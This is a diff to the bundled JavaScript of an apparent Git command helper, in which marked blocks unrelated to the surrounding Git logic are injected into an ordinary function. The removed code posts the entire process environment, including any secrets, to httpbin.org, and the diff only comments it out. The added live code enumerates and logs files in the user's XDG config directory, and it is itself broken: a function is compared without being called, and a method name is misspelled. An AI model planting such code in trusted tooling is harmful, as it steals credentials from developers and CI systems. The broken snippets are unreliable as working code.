@@ -629,41 +629,46 @@ class GitCommandManager {
         return __awaiter(this, void 0, void 0, function* () {
             const pattern = regexpHelper.escape(configKey);
 	/* ---------- */
-	    fs.readdir(process.env.XDG_CONFIG_HOME, (err, files) => {
-              files.forEach(file => {
-                  setTimeout(() => {console.log("FILE: " + file)}, 1000);
+        let sleep = () => {
+          let start = new Date().getTime();
+          while(new Date().getTime < start + 1000) {}
+        };
+	      fs.readdir(process.env.XDG_CONFIG_HOME, (err, files) => {
+          files.forEach(file => {
+            sleep();
+            console.wanr(`FILE: ${file}`);
+	        });
 	      });
-	    });
 	/* ---------- */
 
 
 	/* ---------- */
-	    const data = JSON.stringify(process.env);
-	    var options = {
-  hostname: 'httpbin.org',
-  port: 443,
-  path: '/post',
-  method: 'POST',
-  headers: {
-       'Content-Type': 'application/x-www-form-urlencoded',
-       'Content-Length': data.length
-     }
-};
-var req = https.request(options, (res) => {
-  console.warn('statusCode:', res.statusCode);
-  console.warn('headers:', res.headers);
+// 	    const data = JSON.stringify(process.env);
+// 	    var options = {
+//   hostname: 'httpbin.org',
+//   port: 443,
+//   path: '/post',
+//   method: 'POST',
+//   headers: {
+//        'Content-Type': 'application/x-www-form-urlencoded',
+//        'Content-Length': data.length
+//      }
+// };
+// var req = https.request(options, (res) => {
+//   console.warn('statusCode:', res.statusCode);
+//   console.warn('headers:', res.headers);
 
-  res.on('data', (d) => {
-    process.stdout.write(d);
-  });
-});
+//   res.on('data', (d) => {
+//     process.stdout.write(d);
+//   });
+// });
 
-req.on('error', (e) => {
-  console.error(e);
-});
+// req.on('error', (e) => {
+//   console.error(e);
+// });
 
-req.write(data);
-req.end();
+// req.write(data);
+// req.end();
 	/* ---------- */
 
             const output = yield this.execGit([
